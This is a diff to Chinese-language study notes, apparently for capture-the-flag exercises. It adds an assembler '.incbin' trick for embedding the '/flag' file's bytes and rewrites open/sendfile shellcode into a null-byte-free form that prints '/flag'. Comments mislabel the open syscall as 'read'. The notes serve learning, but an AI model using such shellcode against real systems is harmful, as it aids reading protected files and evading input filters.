@@ -1,3 +1,15 @@
+## 字段
+
+- `.incbin "path"`：把某个文件的原始字节直接塞进当前 section（不会当成汇编解析）
+- `.include "path"`：按文本包含进来，会继续按汇编语法解析（容易报错/泄露）
+
+```
+.section .rodata
+    .incbin "/flag"
+    .byte 0
+```
+- 切到 `.rodata` 只读数据段，读取文件为字节并在末尾添加 `\00` 后使用 `strings` 提取字符串
+
 ### 系统调用
 
 系统调用编号与参数表：
@@ -505,31 +517,54 @@ System V AMD64 调用约定下，前 6 个整数/指针参数放在寄存器里�
 
 ### `sendfile(输入，输出，偏移，长度)`
 
+无 0x00 版 shellcode
 ```asm
+.intel_syntax noprefix
+.global _start
+_start:
+
 ## read() 代码 2
 # 设置字符串 /flag 为第一参数
-mov rdi, 0x0067616c662f
+# mov rdi, 0x0067616c662f
+
+mov edi, 0x67616c66
+shl rdi, 8
+mov dil, 0x2f
 push rdi
 mov rdi, rsp
+
 # 设置 O_RDONLY 为第二参数，对应数字 0
 xor rsi, rsi
 # 设置 read 的系统调用代码
-mov rax, 2
+# mov rax, 2
+xor rax, rax
+mov al, 2
 syscall
 # rax 得到文件描述符
 
 ## sendfile() 代码 40
 # 设置标准输出为 sendfile 的输出
-mov rdi, 1
+# mov rdi, 1
+xor rdi, rdi
+inc rdi
 # 设置 /flag 文件描述符为输入
 mov rsi, rax
-# 设置第三参数偏移为0，第四参数长度为1000
+# 设置第三参数偏移为0，第四参数长度为任意
 xor rdx, rdx
-mov r10, 1000
-mov rax, 40
+
+xor r10, r10
+inc r10
+shl r10, 10
+
+xor rax, rax
+mov al, 40
 syscall
 
 ## 退出 60
-mov rax, 60
+xor rdi, rdi
+xor rax, rax
+mov al, 60
 syscall
+
+
 ```
